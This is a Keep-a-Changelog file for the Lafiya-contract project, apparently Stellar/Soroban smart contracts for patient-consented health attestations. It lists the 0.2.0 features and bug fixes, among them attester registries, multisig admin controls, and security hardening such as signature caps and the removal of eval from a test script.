# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

<!-- From the first automated release on, release-please prepends each version's
     section from Conventional Commits (docs/releasing.md); don't edit by hand.
     The [Unreleased] entries below predate the automation and are folded into
     the first release's notes. -->

## [0.2.0](https://github.com/Lafiya-xyz/Lafiya-contract/compare/v0.1.0...v0.2.0) (2026-10-09)


### Features

* add attester credential validity windows ([0c66c72](https://github.com/Lafiya-xyz/Lafiya-contract/commit/0c66c72768ecd20bc810824e4905ec7f106ed18f))
* add attester suspend and reinstate functionality with admin-gat… ([55ef74d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/55ef74da4d5d9169beb820c59816466bab01b322))
* add attester suspend and reinstate functionality with admin-gating and events ([0b217b7](https://github.com/Lafiya-xyz/Lafiya-contract/commit/0b217b7116b9166c8717aa4cccc2d1782a392516))
* add emergency pause / circuit breaker to both contracts ([a8c60a7](https://github.com/Lafiya-xyz/Lafiya-contract/commit/a8c60a7481b41900d16e4fa1764d90cc02267b15))
* add emergency pause / circuit breaker to both contracts ([2a36ee3](https://github.com/Lafiya-xyz/Lafiya-contract/commit/2a36ee3aba793fa8bf943683ca417fea176c5553)), closes [#3](https://github.com/Lafiya-xyz/Lafiya-contract/issues/3)
* add quota-limited regional registrars ([332e0cb](https://github.com/Lafiya-xyz/Lafiya-contract/commit/332e0cb8db07be1ee391d5f7ec3a70800463d0de))
* add role-based registry permissions ([7e5a29d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/7e5a29d850f06ec5cdde4d8b79307767e40779b5))
* add Soroban integration test suite and CI workflow ([69c0eea](https://github.com/Lafiya-xyz/Lafiya-contract/commit/69c0eea2946c2037741fb4200c7dcb03dec81583))
* add Soroban integration test suite and CI workflow ([d8451f1](https://github.com/Lafiya-xyz/Lafiya-contract/commit/d8451f116f0675db055e5242cd6df40b090a5f15))
* add Stellar testnet deployment script and document in README ([d9a84d9](https://github.com/Lafiya-xyz/Lafiya-contract/commit/d9a84d9933c5b360fbf90840bc6307853dbc6267))
* add Stellar testnet deployment script and document in README ([92190f4](https://github.com/Lafiya-xyz/Lafiya-contract/commit/92190f4fc5f32e2c02f3b1dc8789e2f55d689baf))
* add typescript client bindings generation and publishing strategy ([6336e6c](https://github.com/Lafiya-xyz/Lafiya-contract/commit/6336e6c7e4a00ca357816f0b07694b43932ce8e2))
* **attestation-registry:** add set_attester_registry for repointing ([23c7bfc](https://github.com/Lafiya-xyz/Lafiya-contract/commit/23c7bfc40e4f8b207f293455fa9af60ecb7bec80))
* **attestation-registry:** add set_attester_registry for repointing (ARCH-03) ([8347f10](https://github.com/Lafiya-xyz/Lafiya-contract/commit/8347f109d0ef56df61c72206e86baa06f5d2415b)), closes [#106](https://github.com/Lafiya-xyz/Lafiya-contract/issues/106)
* **attestation-registry:** add storage schema, Attestation type, and errors ([5102e42](https://github.com/Lafiya-xyz/Lafiya-contract/commit/5102e429ec65dae974ab91810b6eed809496a057))
* **attestation-registry:** emit AttestationRecorded event ([43d5226](https://github.com/Lafiya-xyz/Lafiya-contract/commit/43d5226c54c631746a8a0906f8092fdbc104fcc1))
* **attestation-registry:** implement attest with cross-contract allowlist check ([b321dbf](https://github.com/Lafiya-xyz/Lafiya-contract/commit/b321dbfd9bb80d239cf868a04b4de64fe41ffae0))
* **attestation-registry:** implement get_attestation lookup ([bd7c7f0](https://github.com/Lafiya-xyz/Lafiya-contract/commit/bd7c7f0b1af670d9f158af20933a6e073819cca7))
* **attestation-registry:** implement initialize ([e24fc92](https://github.com/Lafiya-xyz/Lafiya-contract/commit/e24fc927f44682ddfba34c91283b553bce645376))
* **attestation-registry:** rate-limit attestations per attester ([3cfd664](https://github.com/Lafiya-xyz/Lafiya-contract/commit/3cfd664ee444bb3972cf157bcd69c4ea9b67c439)), closes [#444](https://github.com/Lafiya-xyz/Lafiya-contract/issues/444)
* **attestation:** add batched and sponsored attestations ([ccffe60](https://github.com/Lafiya-xyz/Lafiya-contract/commit/ccffe60f6492cc928407f6757f8643827ec21a71))
* **attestation:** add batched and sponsored attestations ([23a7c71](https://github.com/Lafiya-xyz/Lafiya-contract/commit/23a7c719b022d94d9bbdab8f9d7307cbb4079df1))
* **attestation:** add bounded batch submissions ([88ce86c](https://github.com/Lafiya-xyz/Lafiya-contract/commit/88ce86c33591716d1f2bce0ae9c7e459e448d41d))
* **attestation:** add patient-selected expiry status ([1b7f6d9](https://github.com/Lafiya-xyz/Lafiya-contract/commit/1b7f6d9fc03b7d04cb0ed2eca6346c0ca8ff7275))
* **attestation:** add withdrawals, revocation status, version links, and batch writes ([91f91f1](https://github.com/Lafiya-xyz/Lafiya-contract/commit/91f91f1d49de06712cda38c447ab00479b5f9dd2))
* **attestation:** allow attesters to withdraw their own verification ([990240b](https://github.com/Lafiya-xyz/Lafiya-contract/commit/990240b7c00e06e969ef8703b8f45ae6b9d27af9))
* **attestation:** anchor Merkle batches ([e34b436](https://github.com/Lafiya-xyz/Lafiya-contract/commit/e34b4361241c80034fc370dce9bd81988483b2d6))
* **attestation:** expose per-attester verification state ([fe0c7cd](https://github.com/Lafiya-xyz/Lafiya-contract/commit/fe0c7cd872302bf8f554fbcba91e328a7a10f79d))
* **attestation:** link successive record versions ([4950465](https://github.com/Lafiya-xyz/Lafiya-contract/commit/495046503c21596aa502341c7925de4661a6e1c0))
* **attestation:** preserve explicit revocation status ([52cf82e](https://github.com/Lafiya-xyz/Lafiya-contract/commit/52cf82e52b369d113e1c481334009a1c0e1eff07))
* **attestation:** record commitment versions ([aba633e](https://github.com/Lafiya-xyz/Lafiya-contract/commit/aba633e004df50f3df6b27984ea2440844d3d6d7))
* **attestation:** require patient consent ([121a95b](https://github.com/Lafiya-xyz/Lafiya-contract/commit/121a95b3ad9d5a93e837e65120c0ec424a7c09e3))
* **attestation:** support relayer-sponsored submissions ([2d21804](https://github.com/Lafiya-xyz/Lafiya-contract/commit/2d21804550a63096fd74125ea0e7c9bbeaff1816))
* **attester-registry:** add batch add/remove attesters with idempote… ([245d0f9](https://github.com/Lafiya-xyz/Lafiya-contract/commit/245d0f968b557219ea0e90877a4427dcd054ed1b))
* **attester-registry:** add batch add/remove attesters with idempotency and budget bound ([5a93edd](https://github.com/Lafiya-xyz/Lafiya-contract/commit/5a93eddb254fabb432ae4f015a79b3a976b086c9))
* **attester-registry:** add storage schema and error types ([ec72a91](https://github.com/Lafiya-xyz/Lafiya-contract/commit/ec72a91a42fb64a7588efbe8a7dafa6317e9adf3))
* **attester-registry:** add update_attester_info and combined status reads ([0537e9d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/0537e9d4655a0598d86869d77b84cc281da27f26))
* **attester-registry:** add update_attester_info and combined status reads ([39c55bf](https://github.com/Lafiya-xyz/Lafiya-contract/commit/39c55bffce1813e9390be49cbbb5ec003ca7a944)), closes [#124](https://github.com/Lafiya-xyz/Lafiya-contract/issues/124)
* **attester-registry:** emit AttesterAdded/AttesterRemoved events ([35e6ec6](https://github.com/Lafiya-xyz/Lafiya-contract/commit/35e6ec667997a0755b5ac0bebe6d19a195ef58e4))
* **attester-registry:** implement admin-gated add_attester/remove_attester ([2289f84](https://github.com/Lafiya-xyz/Lafiya-contract/commit/2289f844fb54916dae0f7565f34cd1d52d52f4b4))
* **attester-registry:** implement initialize ([549f3ed](https://github.com/Lafiya-xyz/Lafiya-contract/commit/549f3ed0c7d0a290e76faebbe835af0c9ced513c))
* **attester-registry:** implement is_attester lookup ([6140699](https://github.com/Lafiya-xyz/Lafiya-contract/commit/61406993c15a5cdf9db1141982f7e44868c68a33))
* benchmark and document per-operation storage cost ([c66f3f5](https://github.com/Lafiya-xyz/Lafiya-contract/commit/c66f3f53389e9697a3882a4b33feab8d1cf42c3a))
* cap unbounded attester allowlist growth ([41ac240](https://github.com/Lafiya-xyz/Lafiya-contract/commit/41ac240930df5178f7b1aa37bb3ca5622f330c32))
* cap unbounded attester allowlist growth ([55b1741](https://github.com/Lafiya-xyz/Lafiya-contract/commit/55b17413efab039c27b5b9b91ef40e5f76e379f6)), closes [#4](https://github.com/Lafiya-xyz/Lafiya-contract/issues/4)
* **commitment:** specify and prototype LRC-1 record commitment scheme ([5369324](https://github.com/Lafiya-xyz/Lafiya-contract/commit/536932464ea65257d10bae26204e300ad8f24290))
* continuous testnet deployment, reset detection, CHW key custody policy, lafiya-web integration guide ([893371e](https://github.com/Lafiya-xyz/Lafiya-contract/commit/893371e8ce8c7cde014e1b54794222f476bcd5f6))
* continuous testnet deployment, reset detection, CHW key custody, lafiya-web guide ([0b93b13](https://github.com/Lafiya-xyz/Lafiya-contract/commit/0b93b130e11f9647db9fa54bafc036c148c851e5)), closes [#424](https://github.com/Lafiya-xyz/Lafiya-contract/issues/424) [#425](https://github.com/Lafiya-xyz/Lafiya-contract/issues/425) [#436](https://github.com/Lafiya-xyz/Lafiya-contract/issues/436) [#437](https://github.com/Lafiya-xyz/Lafiya-contract/issues/437)
* decide and document attestation revocation semantics ([148daee](https://github.com/Lafiya-xyz/Lafiya-contract/commit/148daeea50b7df529384c6230a7d2b6bd7fdc646))
* docs site, local sandbox, multi-jurisdiction ADR, and TLA+ governance models ([ddf949a](https://github.com/Lafiya-xyz/Lafiya-contract/commit/ddf949a3b1e7b774628439cd3f828d35b1803851)), closes [#426](https://github.com/Lafiya-xyz/Lafiya-contract/issues/426) [#429](https://github.com/Lafiya-xyz/Lafiya-contract/issues/429) [#438](https://github.com/Lafiya-xyz/Lafiya-contract/issues/438) [#440](https://github.com/Lafiya-xyz/Lafiya-contract/issues/440)
* docs site, local sandbox, multi-jurisdiction ADR, TLA+ governance models ([8061b9f](https://github.com/Lafiya-xyz/Lafiya-contract/commit/8061b9f3bdb678cc850e0d51c47ba88e45808e59))
* emit registry initialization events ([edb3b4b](https://github.com/Lafiya-xyz/Lafiya-contract/commit/edb3b4b73784cfa83228802d866ebfd53eb1e731))
* emit registry initialization events ([3fa8fe6](https://github.com/Lafiya-xyz/Lafiya-contract/commit/3fa8fe6b4e8bf7e865626e99d8ed4cde3e69ff7e))
* enforce attester region on attestations ([3d77cf0](https://github.com/Lafiya-xyz/Lafiya-contract/commit/3d77cf0cb1f88344af681338918757b105ee6254))
* error/event catalog, verification model, linkability analysis, and nextest CI ([3145e2c](https://github.com/Lafiya-xyz/Lafiya-contract/commit/3145e2c923c7ebb3d04e8b3c3a2b79794561939f))
* error/event catalog, verification model, linkability analysis, and nextest CI ([7c41995](https://github.com/Lafiya-xyz/Lafiya-contract/commit/7c41995418ee5d634c3b665136bbd9b1cfbbebfc)), closes [#442](https://github.com/Lafiya-xyz/Lafiya-contract/issues/442) [#441](https://github.com/Lafiya-xyz/Lafiya-contract/issues/441) [#433](https://github.com/Lafiya-xyz/Lafiya-contract/issues/433) [#430](https://github.com/Lafiya-xyz/Lafiya-contract/issues/430)
* **events:** typed event decoders and resumable streaming package ([11db81b](https://github.com/Lafiya-xyz/Lafiya-contract/commit/11db81b2541a8733950ff3edf72c0f8f3fd9856f)), closes [#412](https://github.com/Lafiya-xyz/Lafiya-contract/issues/412)
* **events:** version registry audit events ([25e5e87](https://github.com/Lafiya-xyz/Lafiya-contract/commit/25e5e876280552d952519ede34620df610db3796))
* fee margins/bumping, deployment ledger, multisig TS bindings, attester fraud scoring ([5afadc9](https://github.com/Lafiya-xyz/Lafiya-contract/commit/5afadc99a2612ec403102e61c2fe22054d86819f))
* harden attestation consent and admin tooling ([f67c745](https://github.com/Lafiya-xyz/Lafiya-contract/commit/f67c745206479caf0f86ac66455b5a6ed2c7d460))
* harden attestation consent and admin tooling- ([2384872](https://github.com/Lafiya-xyz/Lafiya-contract/commit/23848726fff48d21b1b906cc48a96c3f35a66d70))
* harden registry roles and regional attestation controls ([4593778](https://github.com/Lafiya-xyz/Lafiya-contract/commit/4593778fd1dcbdd33cceae4d9ab9f065e59d50a3))
* harden registry roles and regional attestation controls- [#1](https://github.com/Lafiya-xyz/Lafiya-contract/issues/1) ([61de542](https://github.com/Lafiya-xyz/Lafiya-contract/commit/61de542d920e0434162bc58dbb6a3a88452c02ee))
* implement admin-gated contract upgrades with wasm hash update a… ([67401c0](https://github.com/Lafiya-xyz/Lafiya-contract/commit/67401c029d2d9860182a9564e35afbb7635e4afa))
* implement admin-gated contract upgrades with wasm hash update and tests ([ed41daf](https://github.com/Lafiya-xyz/Lafiya-contract/commit/ed41daf847abe6f00645c53b134ace19f00d9991))
* implement attestation revocation and admin-gated revocation function ([890c68b](https://github.com/Lafiya-xyz/Lafiya-contract/commit/890c68b1663a1be493a2dd8e62fdf9c740d1e505))
* implement issues [#387](https://github.com/Lafiya-xyz/Lafiya-contract/issues/387)-390 — LRC-1 adversarial vectors, LRC-2 pr… ([dbc0f07](https://github.com/Lafiya-xyz/Lafiya-contract/commit/dbc0f07bc312d2f5892b3a883972f817aa5a3db8))
* implement issues [#387](https://github.com/Lafiya-xyz/Lafiya-contract/issues/387)-390 — LRC-1 adversarial vectors, LRC-2 prototype, QR payload crate, offline receipts ([6d7ecb3](https://github.com/Lafiya-xyz/Lafiya-contract/commit/6d7ecb36f3407619a3c92ae2f1d0114ef06bf1df))
* implement storage schema versioning for contracts ([5944213](https://github.com/Lafiya-xyz/Lafiya-contract/commit/5944213bab0cb40504698e2ae780c07599114ac0))
* implement storage schema versioning for contracts ([19da2d8](https://github.com/Lafiya-xyz/Lafiya-contract/commit/19da2d8f8969a649f7cae212aa99115b6f09c03c))
* implement two-step admin transfer functionality with error hand… ([b3dc738](https://github.com/Lafiya-xyz/Lafiya-contract/commit/b3dc738b52392ce7d5f5ef618109c59258fe6cb1))
* implement two-step admin transfer functionality with error handling and documentation for both registries. ([9f514ba](https://github.com/Lafiya-xyz/Lafiya-contract/commit/9f514ba68993ea17161853d062d7b37a7fae8a8f))
* implement versioned, domain-separated record-hash protocol ([ed252fa](https://github.com/Lafiya-xyz/Lafiya-contract/commit/ed252fae3f52b101663d9d405365da73dff57fd9))
* implement versioned, domain-separated record-hash protocol ([448f819](https://github.com/Lafiya-xyz/Lafiya-contract/commit/448f819710f180c8fbb7d282085e424a4baa14a6))
* **incentive-pool:** implement M2 USDC incentive settlement contract ([9b738d4](https://github.com/Lafiya-xyz/Lafiya-contract/commit/9b738d4f199edeb6ba8cafb7a16cac79072c4e15)), closes [#130](https://github.com/Lafiya-xyz/Lafiya-contract/issues/130)
* **indexer:** reference event indexer with Postgres storage and query API ([aedf7ef](https://github.com/Lafiya-xyz/Lafiya-contract/commit/aedf7ef159e368fec241a9609279bb29129cb6ed)), closes [#413](https://github.com/Lafiya-xyz/Lafiya-contract/issues/413)
* interface negotiation, Python tooling gates, audit package, bug bounty ([c0f6512](https://github.com/Lafiya-xyz/Lafiya-contract/commit/c0f651211b52d5bd4749cbea9bb6cbb4030bda22)), closes [#423](https://github.com/Lafiya-xyz/Lafiya-contract/issues/423) [#434](https://github.com/Lafiya-xyz/Lafiya-contract/issues/434) [#435](https://github.com/Lafiya-xyz/Lafiya-contract/issues/435) [#443](https://github.com/Lafiya-xyz/Lafiya-contract/issues/443)
* **multisig-account:** add N-of-M admin authorization ([cb9358c](https://github.com/Lafiya-xyz/Lafiya-contract/commit/cb9358cae54bd2b4e656513c1029a30c1491d8c7))
* **multisig-account:** add N-of-M admin authorization ([096cc68](https://github.com/Lafiya-xyz/Lafiya-contract/commit/096cc68ac347cdf03857e8d1dd10935973c52113))
* **multisig-account:** publish signer and authorization details ([8da6d6a](https://github.com/Lafiya-xyz/Lafiya-contract/commit/8da6d6a02cd27455b8e38da356c1cdd92bf3adbd))
* **multisig:** add weighted role quorums ([a4c71ba](https://github.com/Lafiya-xyz/Lafiya-contract/commit/a4c71badd83849fc9e510a94ffca9de9aab2f2c1))
* **multisig:** allow signer set rotation ([9626794](https://github.com/Lafiya-xyz/Lafiya-contract/commit/96267943d429c52768c837d40be2472c7cff4c13))
* **multisig:** support P-256 signer keys ([a9ce554](https://github.com/Lafiya-xyz/Lafiya-contract/commit/a9ce554863e914259e253a1923358431a957bc08))
* **release:** reproducible, attested, automated releases and cargo xtask ([8c33fd3](https://github.com/Lafiya-xyz/Lafiya-contract/commit/8c33fd300a71d80c1553d08937df7c3ba1228e00))
* **release:** reproducible, attested, automated releases and cargo xtask ([5e2ad34](https://github.com/Lafiya-xyz/Lafiya-contract/commit/5e2ad343f18af620c6c0daa78cdad847e812db83)), closes [#418](https://github.com/Lafiya-xyz/Lafiya-contract/issues/418) [#419](https://github.com/Lafiya-xyz/Lafiya-contract/issues/419) [#420](https://github.com/Lafiya-xyz/Lafiya-contract/issues/420) [#427](https://github.com/Lafiya-xyz/Lafiya-contract/issues/427)
* **release:** spike a versioned release manifest for contracts, bindings, events, and deployments ([67006e8](https://github.com/Lafiya-xyz/Lafiya-contract/commit/67006e8e742cb45ebc55ffe23fd6b19a61ff39a4))
* **rpc-resilience:** deterministic tx outcomes via ledger bounds and sequence tracking ([b7e46b5](https://github.com/Lafiya-xyz/Lafiya-contract/commit/b7e46b5df116d53e0b88f0110ce90d4711a0b61d)), closes [#407](https://github.com/Lafiya-xyz/Lafiya-contract/issues/407)
* **rpc:** specify and prototype RPC provider failover and transaction recovery ([7a3454d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/7a3454d2e9067a05a1a1eaaf5e32f147beed1292))
* **rpc:** specify and prototype RPC provider failover and transaction recovery ([dcb2ad2](https://github.com/Lafiya-xyz/Lafiya-contract/commit/dcb2ad229d9c02ab1f281fafe2d2c8028a87971f))
* strict config, RPC failover in CLI, SEP-1 stellar.toml, conformance CI ([620a36a](https://github.com/Lafiya-xyz/Lafiya-contract/commit/620a36a3d8158a1d03dd5035e29e1a15c6c5f353))
* strict config, RPC failover in CLI, SEP-1 stellar.toml, conformance CI ([74eec2d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/74eec2d35db1a623dcda589f30f41ae3dc68f356)), closes [#403](https://github.com/Lafiya-xyz/Lafiya-contract/issues/403) [#404](https://github.com/Lafiya-xyz/Lafiya-contract/issues/404) [#405](https://github.com/Lafiya-xyz/Lafiya-contract/issues/405) [#448](https://github.com/Lafiya-xyz/Lafiya-contract/issues/448)
* **tooling:** auth decoder, security watchdog, transparency dashboard, and operator observability ([042b1ed](https://github.com/Lafiya-xyz/Lafiya-contract/commit/042b1edcaef0527a8cd5a0b95e2b826c32a50732)), closes [#406](https://github.com/Lafiya-xyz/Lafiya-contract/issues/406) [#414](https://github.com/Lafiya-xyz/Lafiya-contract/issues/414) [#416](https://github.com/Lafiya-xyz/Lafiya-contract/issues/416) [#417](https://github.com/Lafiya-xyz/Lafiya-contract/issues/417)
* tx ledger bounds, verifier SDK, typed events, and event indexer ([#407](https://github.com/Lafiya-xyz/Lafiya-contract/issues/407) [#410](https://github.com/Lafiya-xyz/Lafiya-contract/issues/410) [#412](https://github.com/Lafiya-xyz/Lafiya-contract/issues/412) [#413](https://github.com/Lafiya-xyz/Lafiya-contract/issues/413)) ([6e04fd6](https://github.com/Lafiya-xyz/Lafiya-contract/commit/6e04fd6b1290946dc6a79aa92e9acc5c9daa0257))
* **verifier-sdk:** high-level @lafiya/verifier package on generated bindings ([c8cb4e8](https://github.com/Lafiya-xyz/Lafiya-contract/commit/c8cb4e86177f696b5f4887d25a24bc8d4cdd66b8)), closes [#410](https://github.com/Lafiya-xyz/Lafiya-contract/issues/410)


### Bug Fixes

* 14: Add instance storage TTL extensions to Admin and AttesterRegistry ([43f7b2e](https://github.com/Lafiya-xyz/Lafiya-contract/commit/43f7b2e71b1dc8d3cf9ea96121a53ddabecde941))
* apply cargo fmt formatting ([cba7b18](https://github.com/Lafiya-xyz/Lafiya-contract/commit/cba7b1884b50a32419c731026587127ad7ee0bbd))
* ARCH-01, SEC-02, attester import CLI, config env injection fix ([b662dce](https://github.com/Lafiya-xyz/Lafiya-contract/commit/b662dce844818fd91c7f1f590f2e7b854772f834))
* ARCH-01, SEC-02, attester import CLI, config env injection fix ([4bdbd33](https://github.com/Lafiya-xyz/Lafiya-contract/commit/4bdbd33668b817dbf63101d80f1ad2731ef233b0))
* **attestation-registry:** call attester-registry via contractclient interface ([748cc99](https://github.com/Lafiya-xyz/Lafiya-contract/commit/748cc9928be3e9dbfb66865dd2bff2cb59b9165e))
* **attestation-registry:** guard against degenerate/  unverifiable attester-registry wiring on initialize ([#2](https://github.com/Lafiya-xyz/Lafiya-contract/issues/2))  Add best-effort sanity check in initialize that calls is_attester  on the provided attester_registry address with a throwaway address  and returns InvalidRegistryWiring if the call traps.  Documents that this confirms interface conformance, not trustworthiness. ([4651e2a](https://github.com/Lafiya-xyz/Lafiya-contract/commit/4651e2a67f844af1496e34aff80462192f34449c))
* **attestation-registry:** guard against degenerate/unverifiable attester-registry wiring on initialize ([#2](https://github.com/Lafiya-xyz/Lafiya-contract/issues/2)) ([c2f6afb](https://github.com/Lafiya-xyz/Lafiya-contract/commit/c2f6afbc86a0c9c4e5d8e68743b11517fcdc9216))
* **attestation-registry:** retain attestations per attester ([1c5c54b](https://github.com/Lafiya-xyz/Lafiya-contract/commit/1c5c54bc026ddf1530d042f0e216438b077f40e7))
* **attestation:** report missing records on revoke ([4b35cc3](https://github.com/Lafiya-xyz/Lafiya-contract/commit/4b35cc30d0568ca98ed6d4cb8fa3ead55cc80054))
* **attestation:** validate registry repoints ([a522355](https://github.com/Lafiya-xyz/Lafiya-contract/commit/a52235545edaac3fd139ba490453f7d49d1840ef))
* **attester-registry:** block cap changes while paused ([23e1c72](https://github.com/Lafiya-xyz/Lafiya-contract/commit/23e1c72c47f97e70f115521964c8192e6b61bd82))
* **attester-registry:** clear phantom suspensions on enrollment ([afaecc2](https://github.com/Lafiya-xyz/Lafiya-contract/commit/afaecc236564153d1947211fb68d72aafcfe4d18))
* **attester-registry:** clear stale suspensions on enrollment ([3360140](https://github.com/Lafiya-xyz/Lafiya-contract/commit/3360140bd9dde18d860f5005f8c9f7b7ca2685d6))
* **attester-registry:** emit removals only when present ([09c3257](https://github.com/Lafiya-xyz/Lafiya-contract/commit/09c325731c1ec3c83d9dc0650f4b4a67c8332555))
* **attester-registry:** make duplicate enrollment a no-op ([e1db6c2](https://github.com/Lafiya-xyz/Lafiya-contract/commit/e1db6c298cef6378d90dbb6c9633e6c658519739))
* **bindings:** scope package names to [@lafiya](https://github.com/lafiya) and add binding smoke tests ([05822e7](https://github.com/Lafiya-xyz/Lafiya-contract/commit/05822e7562cb3cc166e7e55645c0df8d4d9f5d01))
* **bindings:** scope package names to [@lafiya](https://github.com/lafiya) and add binding smoke tests ([89a8522](https://github.com/Lafiya-xyz/Lafiya-contract/commit/89a85222f7bc5f81934c7daa32692059ddc57db3)), closes [#256](https://github.com/Lafiya-xyz/Lafiya-contract/issues/256) [#257](https://github.com/Lafiya-xyz/Lafiya-contract/issues/257) [#258](https://github.com/Lafiya-xyz/Lafiya-contract/issues/258) [#259](https://github.com/Lafiya-xyz/Lafiya-contract/issues/259)
* **ci,scripts:** smoke-test input validation, deploy.sh placeholder warnings, release-manifest arg help ([28cea5d](https://github.com/Lafiya-xyz/Lafiya-contract/commit/28cea5dfa4616d43e481763011b54070f1e4ec84))
* **ci,scripts:** validate smoke-test network input, clarify placeholders, add arg help ([66d95d7](https://github.com/Lafiya-xyz/Lafiya-contract/commit/66d95d7abe74a67bd4527a4a5759557fb1359b87)), closes [#255](https://github.com/Lafiya-xyz/Lafiya-contract/issues/255) [#250](https://github.com/Lafiya-xyz/Lafiya-contract/issues/250) [#254](https://github.com/Lafiya-xyz/Lafiya-contract/issues/254)
* **ci:** apply rustfmt and regenerate lockfile for lafiya-rpc-resilience ([add6b81](https://github.com/Lafiya-xyz/Lafiya-contract/commit/add6b81c8f7c8f845aeacc6871cbc0f1d687fce0))
* **ci:** drop wasm32-unknown-unknown target from docs workflow ([0839bc8](https://github.com/Lafiya-xyz/Lafiya-contract/commit/0839bc8cdbdf381797c99710a1d351ff7a0f1258))
* **ci:** drop wasm32-unknown-unknown target from docs workflow ([ea10d84](https://github.com/Lafiya-xyz/Lafiya-contract/commit/ea10d84ef300d1438382c4f250df4796fe620f33))
* **ci:** drop wasm32-unknown-unknown target from docs workflow ([14aa35a](https://github.com/Lafiya-xyz/Lafiya-contract/commit/14aa35a5cfdaa151f8e0181e540a61109b64256c))
* **ci:** only deploy docs to GitHub Pages on push to main ([e6548d0](https://github.com/Lafiya-xyz/Lafiya-contract/commit/e6548d0e30cc396c4f0e62731ee3e21bc5a11058))
* **ci:** regenerate lockfile, fix formatting, and fix event-order assumption in test ([afb5d8a](https://github.com/Lafiya-xyz/Lafiya-contract/commit/afb5d8a8e1c6f7bc764f35eaab6b3a2f82b0c653))
* **ci:** unbreak CI checks broken since before this branch existed ([844f423](https://github.com/Lafiya-xyz/Lafiya-contract/commit/844f423ac3b19e0aaf2de067a28a3dfe9cf4d793))
* **cli,docs:** resolve issues [#391](https://github.com/Lafiya-xyz/Lafiya-contract/issues/391) [#392](https://github.com/Lafiya-xyz/Lafiya-contract/issues/392) [#393](https://github.com/Lafiya-xyz/Lafiya-contract/issues/393) [#394](https://github.com/Lafiya-xyz/Lafiya-contract/issues/394) ([666cd24](https://github.com/Lafiya-xyz/Lafiya-contract/commit/666cd241ae5dcef93c83ca52c4f30dd0cd79a1d3))
* **cli,docs:** resolve issues [#391](https://github.com/Lafiya-xyz/Lafiya-contract/issues/391) [#392](https://github.com/Lafiya-xyz/Lafiya-contract/issues/392) [#393](https://github.com/Lafiya-xyz/Lafiya-contract/issues/393) [#394](https://github.com/Lafiya-xyz/Lafiya-contract/issues/394) ([1292961](https://github.com/Lafiya-xyz/Lafiya-contract/commit/129296160bb182d76c738db496474a8a1369a5be))
* **deps:** restore missing serde_json and sha2 dependencies and sync Cargo.lock ([3179114](https://github.com/Lafiya-xyz/Lafiya-contract/commit/31791143f9f65102fff3304a6c0a7bc03cd09d0a))
* doc/lint/license cleanups across contracts and bindings ([617fc63](https://github.com/Lafiya-xyz/Lafiya-contract/commit/617fc6319d4ec107d5aa2a6c69fe07832a1c5651))
* doc/lint/license cleanups across contracts and bindings ([f7c53da](https://github.com/Lafiya-xyz/Lafiya-contract/commit/f7c53da380d7c4308978154c987e62ba1f89662b)), closes [#266](https://github.com/Lafiya-xyz/Lafiya-contract/issues/266) [#263](https://github.com/Lafiya-xyz/Lafiya-contract/issues/263) [#261](https://github.com/Lafiya-xyz/Lafiya-contract/issues/261) [#260](https://github.com/Lafiya-xyz/Lafiya-contract/issues/260)
* **lafiya-commitment:** return BytesN from soroban sha256 helpers ([b0b28f4](https://github.com/Lafiya-xyz/Lafiya-contract/commit/b0b28f41b024191acd29bde58e81277e13db42cb))
* **multisig-account:** cap signature count in __check_auth ([28093ed](https://github.com/Lafiya-xyz/Lafiya-contract/commit/28093edf186e1d4b027f25d93daca5d96776aa17))
* **multisig-account:** cap signature count in __check_auth (SEC-01) ([1451dc7](https://github.com/Lafiya-xyz/Lafiya-contract/commit/1451dc7fe8a644aa31ccd1993df52896fa065797)), closes [#107](https://github.com/Lafiya-xyz/Lafiya-contract/issues/107)
* **multisig-account:** extend instance storage TTL to prevent archival ([c44d1f6](https://github.com/Lafiya-xyz/Lafiya-contract/commit/c44d1f65358192f9228fb06d14d00edbd7dd2bda))
* **multisig-account:** extend instance storage TTL to prevent archival (SEC-02) ([bfe5214](https://github.com/Lafiya-xyz/Lafiya-contract/commit/bfe5214d9bb7c2f467985b9bffc046f14d14e44a)), closes [#108](https://github.com/Lafiya-xyz/Lafiya-contract/issues/108)
* pin soroban-sdk to 25.3.1 and target wasm32v1-none ([fa0adbf](https://github.com/Lafiya-xyz/Lafiya-contract/commit/fa0adbf694c67cf43c096ba8c3679be16a15b5b0))
* **registry:** batch attesters, TTL extensions, revocation semantics ADR ([1d95394](https://github.com/Lafiya-xyz/Lafiya-contract/commit/1d953943a7e5d6e5004dd3fb6960f4ea09adf322)), closes [#103](https://github.com/Lafiya-xyz/Lafiya-contract/issues/103) [#104](https://github.com/Lafiya-xyz/Lafiya-contract/issues/104) [#105](https://github.com/Lafiya-xyz/Lafiya-contract/issues/105)
* repair broken merges so fmt, clippy and tests pass ([dd36b06](https://github.com/Lafiya-xyz/Lafiya-contract/commit/dd36b06213e3ebadb0967e4a0082d3a267bb6f1f))
* repair broken merges so fmt, clippy and tests pass ([3285c61](https://github.com/Lafiya-xyz/Lafiya-contract/commit/3285c61e0d0a3f91b0b33630f2eb3db6f2e59ef2))
* resolve clippy, formatting, and WASM target compilation errors ([4949ad3](https://github.com/Lafiya-xyz/Lafiya-contract/commit/4949ad30057aef3c721c91df31abfe60cf93547d))
* **rpc-resilience:** document remaining public API surface ([1f7a6ad](https://github.com/Lafiya-xyz/Lafiya-contract/commit/1f7a6ad4efe923b45a497de5f5d8301343387591))
* **scripts:** clear error for missing python3/tomllib, add pre-commit hook ([b240f68](https://github.com/Lafiya-xyz/Lafiya-contract/commit/b240f6803f214af2a3ff83ef1337ca1dbd58e3ce)), closes [#247](https://github.com/Lafiya-xyz/Lafiya-contract/issues/247) [#248](https://github.com/Lafiya-xyz/Lafiya-contract/issues/248) [#251](https://github.com/Lafiya-xyz/Lafiya-contract/issues/251) [#252](https://github.com/Lafiya-xyz/Lafiya-contract/issues/252)
* **scripts:** clear python3/tomllib error, add pre-commit hook for README check ([313ea62](https://github.com/Lafiya-xyz/Lafiya-contract/commit/313ea620c7b271f85691c833467228bae9df230d))
* **scripts:** remove eval-based command execution from smoke-test.sh ([d7adb09](https://github.com/Lafiya-xyz/Lafiya-contract/commit/d7adb092a4fb56bb6b28619e79fd03f065861a3b))
